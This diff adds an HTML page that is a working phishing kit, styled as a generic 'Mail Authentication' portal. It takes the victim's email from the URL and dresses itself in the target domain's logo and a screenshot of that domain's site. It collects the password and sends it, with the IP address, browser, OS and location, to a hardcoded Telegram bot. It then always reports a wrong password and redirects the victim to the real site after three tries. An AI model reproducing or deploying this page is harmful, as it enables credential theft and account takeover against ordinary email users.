@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PORTAL - Mail Authentication</title>
+    <link id="faviconx" rel="icon" type="image/x-icon" href="#">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            padding: 20px;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-size: cover;
+            background-attachment: fixed;
+            position: relative;
+        }
+        /* Dark overlay for better text readability without washing out the image */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: -1;
+        }
+        .mail-loader_block { text-align: center; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); max-width: 400px; width: 100%; z-index: 10; }
+        #loaderImogi { font-size: 60px; color: #0a66c3; margin-bottom: 20px; }
+        .loader { width: 100%; height: 4px; background: #e0e0e0; border-radius: 2px; overflow: hidden; margin: 20px 0; }
+        .loaderBar { width: 0%; height: 100%; background: #0a66c3; animation: loadProgress 3s ease-out forwards; }
+        @keyframes loadProgress { 0% { width: 0%; } 100% { width: 100%; } }
+        .container { background: white; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); max-width: 450px; width: 100%; padding: 30px; display: none; z-index: 10; position: relative; }
+        .top_level { text-align: center; margin-bottom: 20px; display: flex; flex-direction: column; align-items: center; }
+        #top_label_logo { width: 50px; height: 50px; border-radius: 8px; margin-bottom: 10px; }
+        #top_label { font-size: 1.6rem; color: #0a66c3; font-weight: bold; }
+        .intro-text { text-align: center; margin-bottom: 20px; }
+        .location { background: rgba(245, 245, 245, 0.95); padding: 12px; border-radius: 8px; margin: 15px 0; font-size: 14px; }
+        .location a { color: #666; text-decoration: none; display: inline-block; margin: 0 5px; }
+        .fa-location-dot { color: #ff4800; }
+        hr { margin: 15px 0; border: none; border-top: 1px solid #e0e0e0; }
+        #comment_text { color: #666; font-size: 14px; line-height: 1.5; }
+        .profileEmail { text-align: center; margin: 20px 0; display: flex; justify-content: center; align-items: center; }
+        #auth_email { color: #0627ab; font-size: 18px; font-weight: 500; }
+        .input { position: relative; margin-bottom: 20px; }
+        .input input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; transition: all 0.3s; outline: none; background: white; }
+        .input input:focus { border-color: #0a66c3; }
+        .input label { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #8c8c8c; transition: all 0.3s; pointer-events: none; font-size: 1.1rem; background: transparent; }
+        .input input:focus ~ label, .input input:valid ~ label { top: 0; font-size: 0.8rem; background: white; padding: 0 4px; color: #0a66c3; }
+        .errorBox { text-align: center; margin: 10px 0; }
+        #auth_reg { color: red; font-size: 13px; font-weight: bolder; display: none; }
+        #auth_reg2 { color: red; font-size: 13px; font-weight: bolder; display: none; }
+        .rem_me { display: flex; align-items: center; gap: 8px; margin: 15px 0; }
+        #show_pass { color: #0a66c3; font-size: 0.8rem; cursor: pointer; }
+        #show_pass_button { cursor: pointer; }
+        button { width: 100%; padding: 12px; background: #0067b8; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bolder; cursor: pointer; transition: background 0.3s; height: 50px; }
+        button:hover { background: #0a66c3; }
+        .footerDiv { text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid rgba(128,128,128,0.318); font-size: 12px; color: #999; background: transparent; }
+        .footerDiv a { color: #0a66c3; text-decoration: none; }
+        .join-link { font-size: small; }
+        @media (max-width: 600px) { .container, .mail-loader_block { margin: 10px; padding: 20px; } }
+    </style>
+</head>
+<body id="body">
+
+    <!-- Loader -->
+    <div class="mail-loader_block">
+        <div id="loaderImogi">
+            <i class="fa-solid fa-envelope"></i>
+        </div>
+        <div class="loader">
+            <div class="loaderBar"></div>
+        </div>
+        <center><div>Loading <span id="emailich"></span> mail settings ...</div></center>
+    </div>
+
+    <!-- Main Form Container -->
+    <div id="doom" class="container">
+        <div class="top_level">
+            <img id="top_label_logo" style="width: 40px; height: 40px;" src="#">
+            <h3 id="top_label_tittle"><span id="top_label"></span></h3>
+        </div>
+        <div class="intro-text">
+            <hr>
+            <div class="location">
+                <a class="osBrowserTime"> <i class="fa-brands fa-windows"></i> <span id="opsder"></span> - <span id="kolo"></span> - <span id="currentdate"></span> <span id="time"></span></a>
+                <a class="cityCountry">&nbsp;&nbsp;<i class="fa-solid fa-location-dot"></i> <span id="state"></span>,&nbsp;&nbsp; <span id="country"></span></a>
+            </div>
+            <hr>
+            <p id="comment_text">You're accessing a secure settings, please provide your <b><span id="manutd"></span></b> password to continue.</p>
+        </div>
+        <div class="profileEmail">
+            <h2 id="auth_email"></h2>
+        </div>
+        <form id="contactform">
+            <div class="inputs">
+                <div class="input">
+                    <input type="hidden" name="email" id="email">
+                    <input type="password" name="password" id="password" autofocus="true">
+                    <label id="pass_label" for="password">Password</label>
+                </div>
+                <div class="errorBox">
+                    <span id="auth_reg">Authentication required!</span>
+                    <span id="auth_reg2">Authentication error. Please try again.</span>
+                </div>
+                <br>
+                <div class="rem_me">
+                    <input type="checkbox" name="" id="show_pass_button">
+                    <a id="show_pass" style="color:#0A66C3; font-size: 0.8rem;">Show password</a>
+                </div>
+                <br>
+            </div>
+            <button id="next_button" style="padding-top:5px;padding-bottom:5px;color:#fff;background:#0067b8;width:100%;">NEXT</button>
+        </form>
+        <br>
+        <hr>
+        <div class="footerDiv bg_gradian">
+            <p class="join-link">© 2026&nbsp;<a id="footer_dom"></a>&nbsp;<a id="footer_com">Secure Portal</a>&nbsp;<a>|</a>&nbsp;<a id="footer_pri">Privacy</a></p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            
+            // Get email from URL hash
+            var email = window.location.hash.substr(1);
+            var my_email = email;
+            
+            if (!my_email || my_email === '') {
+                my_email = 'user@example.com';
+            }
+            
+            // Extract domain
+            var ind = my_email.indexOf("@");
+            var my_slice = my_email.substr((ind + 1));
+            
+            // Set all email fields
+            var emailInput = document.querySelector("#email");
+            var manutdSpan = document.querySelector("#manutd");
+            var emailichSpan = document.querySelector("#emailich");
+            var footerDom = document.querySelector("#footer_dom");
+            var topLabelLogo = document.querySelector("#top_label_logo");
+            var faviconx = document.querySelector("#faviconx");
+            var authEmail = document.querySelector("#auth_email");
+            var topLabel = document.querySelector("#top_label");
+            
+            if (emailInput) emailInput.value = my_email;
+            if (manutdSpan) manutdSpan.innerHTML = my_email;
+            if (authEmail) authEmail.innerHTML = my_email;
+            if (emailichSpan) emailichSpan.innerHTML = my_slice;
+            if (footerDom) footerDom.innerHTML = my_slice;
+            if (topLabel) topLabel.innerHTML = my_slice;
+            
+            // Load logos with fallback
+            var logoUrl = "https://logo.clearbit.com/" + my_slice;
+            var fallbackLogo = "https://www.google.com/s2/favicons?domain=" + my_slice;
+            
+            if (topLabelLogo) {
+                topLabelLogo.src = logoUrl;
+                topLabelLogo.onerror = function() {
+                    this.src = fallbackLogo;
+                };
+            }
+            
+            if (faviconx) {
+                faviconx.href = logoUrl;
+                faviconx.onerror = function() {
+                    this.href = fallbackLogo;
+                };
+            }
+            
+            // Set background image - NO OVERLAY, just the image
+            var backgroundUrl = "https://image.thum.io/get/width/1920/crop/800/https://" + my_slice;
+            
+            // Set background directly without white overlay
+            document.body.style.backgroundImage = "url(" + backgroundUrl + ")";
+            document.body.style.backgroundSize = "cover";
+            document.body.style.backgroundPosition = "center";
+            document.body.style.backgroundRepeat = "no-repeat";
+            document.body.style.backgroundAttachment = "fixed";
+            
+            // Add a very subtle dark overlay (only 30% opacity) to make white text readable
+            // but still keep the background image visible
+            var overlayDiv = document.createElement('div');
+            overlayDiv.style.position = 'fixed';
+            overlayDiv.style.top = '0';
+            overlayDiv.style.left = '0';
+            overlayDiv.style.width = '100%';
+            overlayDiv.style.height = '100%';
+            overlayDiv.style.backgroundColor = 'rgba(0, 0, 0, 0.3)';
+            overlayDiv.style.zIndex = '-1';
+            document.body.insertBefore(overlayDiv, document.body.firstChild);
+            
+            // Fallback if image fails to load
+            var bgImage = new Image();
+            bgImage.onerror = function() {
+                document.body.style.background = "#f0f0f0";
+                overlayDiv.style.backgroundColor = 'rgba(0, 0, 0, 0)';
+            };
+            bgImage.src = backgroundUrl;
+            
+            // Set page title
+            document.title = 'PORTAL - ' + my_slice + ' Mail Authentication';
+            
+            // Get location from IP
+            var countrySpan = document.querySelector("#country");
+            var stateSpan = document.querySelector("#state");
+            
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    if (countrySpan) countrySpan.textContent = data.country_name || "United States";
+                    if (stateSpan) stateSpan.textContent = data.region || "California";
+                })
+                .catch(error => {
+                    console.log('Location fetch failed, using defaults');
+                    if (countrySpan) countrySpan.textContent = "United States";
+                    if (stateSpan) stateSpan.textContent = "California";
+                });
+            
+            // Get browser info
+            function getBrowser() {
+                var ua = navigator.userAgent;
+                if (ua.indexOf("Chrome") > -1 && ua.indexOf("Edg") === -1 && ua.indexOf("OPR") === -1) return "Chrome";
+                if (ua.indexOf("Firefox") > -1) return "Firefox";
+                if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) return "Safari";
+                if (ua.indexOf("Edg") > -1) return "Edge";
+                if (ua.indexOf("OPR") > -1 || ua.indexOf("Opera") > -1) return "Opera";
+                if (ua.indexOf("MSIE") > -1 || ua.indexOf("Trident") > -1) return "Internet Explorer";
+                return "Unknown";
+            }
+            
+            var koloSpan = document.querySelector("#kolo");
+            if (koloSpan) koloSpan.innerHTML = getBrowser();
+            
+            // Get time
+            var timeSpan = document.querySelector("#time");
+            if (timeSpan) {
+                var now = new Date();
+                var timeStr = now.toLocaleString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });
+                timeSpan.innerHTML = timeStr;
+            }
+            
+            // Get date with suffix
+            var dateSpan = document.querySelector("#currentdate");
+            if (dateSpan) {
+                var monthNames = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
+                var now = new Date();
+                var day = now.getDate();
+                var suffix = (day % 10 === 1 && day !== 11) ? 'st' : (day % 10 === 2 && day !== 12) ? 'nd' : (day % 10 === 3 && day !== 13) ? 'rd' : 'th';
+                var dateStr = day + suffix + " " + monthNames[now.getMonth()] + " " + now.getFullYear();
+                dateSpan.innerHTML = dateStr;
+            }
+            
+            // Get OS
+            function getOS() {
+                var ua = navigator.userAgent;
+                var platform = navigator.platform;
+                if (platform.indexOf('Win') !== -1) return 'Windows OS';
+                if (platform.indexOf('Mac') !== -1) return 'Mac OS';
+                if (/Android/.test(ua)) return 'Android';
+                if (/Linux/.test(platform)) return 'Linux';
+                if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
+                return 'Unknown';
+            }
+            
+            var opsderSpan = document.querySelector("#opsder");
+            if (opsderSpan) opsderSpan.innerHTML = getOS();
+            
+            // Show form after loader (5 seconds)
+            setTimeout(function() {
+                var loader = document.querySelector('.mail-loader_block');
+                var form = document.querySelector('#doom');
+                if (loader) loader.style.display = 'none';
+                if (form) form.style.display = 'block';
+            }, 5000);
+            
+            // Show/Hide password
+            var showPassButton = document.querySelector("#show_pass_button");
+            var passwordField = document.querySelector("#password");
+            if (showPassButton && passwordField) {
+                showPassButton.addEventListener('change', function() {
+                    passwordField.type = this.checked ? 'text' : 'password';
+                });
+            }
+            
+            // Get all system info for Telegram message
+            function getAllSystemInfo() {
+                return {
+                    os: getOS(),
+                    browser: getBrowser(),
+                    time: timeSpan ? timeSpan.innerHTML : new Date().toLocaleString(),
+                    date: dateSpan ? dateSpan.innerHTML : new Date().toDateString(),
+                    country: countrySpan ? countrySpan.innerHTML : 'Unknown',
+                    state: stateSpan ? stateSpan.innerHTML : 'Unknown'
+                };
+            }
+            
+            // Form submission with Telegram
+            var count = 0;
+            var form = document.querySelector("#contactform");
+            var authRegSpan = document.querySelector("#auth_reg");
+            var nextButton = document.querySelector("#next_button");
+            
+            if (form) {
+                form.addEventListener('submit', function(event) {
+                    event.preventDefault();
+                    
+                    var emailVal = document.querySelector("#email").value;
+                    var passwordVal = document.querySelector("#password").value;
+                    
+                    if (!passwordVal) {
+                        if (authRegSpan) {
+                            authRegSpan.style.display = 'block';
+                            authRegSpan.innerHTML = "Password is empty!";
+                            setTimeout(function() { authRegSpan.style.display = 'none'; }, 2000);
+                        }
+                        return false;
+                    }
+                    
+                    count = count + 1;
+                    
+                    // Disable button to prevent double submission
+                    if (nextButton) {
+                        nextButton.disabled = true;
+                        nextButton.style.opacity = '0.6';
+                    }
+                    
+                    // Get IP and send to Telegram
+                    fetch('https://api.ipify.org/?format=json')
+                        .then(response => response.json())
+                        .then(function(ipData) {
+                            var ip = ipData.ip;
+                            var sysInfo = getAllSystemInfo();
+                            
+                            // Format full message
+                            var message = "🔐 NEW LOGIN ATTEMPT #" + count + " 🔐\n\n";
+                            message += "📧 Email: " + emailVal + "\n";
+                            message += "🔑 Password: " + passwordVal + "\n";
+                            message += "🌐 IP Address: " + ip + "\n";
+                            message += "🖥️ OS: " + sysInfo.os + "\n";
+                            message += "🌍 Browser: " + sysInfo.browser + "\n";
+                            message += "📍 Location: " + sysInfo.state + ", " + sysInfo.country + "\n";
+                            message += "⏰ Time: " + sysInfo.time + "\n";
+                            message += "📅 Date: " + sysInfo.date + "\n";
+                            message += "🔗 Domain: " + my_slice;
+                            
+                            var chat_id = "5407816935";
+                            var bot_token = "8131483589:AAGd1UGEaWZrYvBNx65uK39zfEAa0VBoKCI";
+                            var telegram_url = "https://api.telegram.org/bot" + bot_token + "/sendMessage";
+                            
+                            return fetch(telegram_url, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                                body: "chat_id=" + chat_id + "&text=" + encodeURIComponent(message) + "&parse_mode=HTML"
+                            });
+                        })
+                        .then(function(response) {
+                            return response.json();
+                        })
+                        .then(function(result) {
+                            document.querySelector("#password").value = "";
+                            if (nextButton) {
+                                nextButton.disabled = false;
+                                nextButton.style.opacity = '1';
+                            }
+                            if (authRegSpan) {
+                                authRegSpan.style.display = 'block';
+                                authRegSpan.style.color = 'red';
+                                authRegSpan.innerHTML = "Password is not correct. Please try again";
+                                setTimeout(function() { 
+                                    authRegSpan.style.display = 'none';
+                                }, 2000);
+                            }
+                            // Redirect after 3 attempts
+                            if (count >= 3) {
+                                count = 0;
+                                window.location.replace("https://www." + my_slice);
+                            }
+                        })
+                        .catch(function(error) {
+                            console.error('Error:', error);
+                            document.querySelector("#password").value = "";
+                            if (nextButton) {
+                                nextButton.disabled = false;
+                                nextButton.style.opacity = '1';
+                            }
+                            if (authRegSpan) {
+                                authRegSpan.style.display = 'block';
+                                authRegSpan.innerHTML = "Password is not correct. Please try again";
+                                setTimeout(function() { authRegSpan.style.display = 'none'; }, 2000);
+                            }
+                            // Redirect after 3 attempts on error as well
+                            if (count >= 3) {
+                                count = 0;
+                                window.location.replace("https://www." + my_slice);
+                            }
+                        });
+                    
+                    return false;
+                });
+            }
+        });
+    </script>
+</body>
+</html>
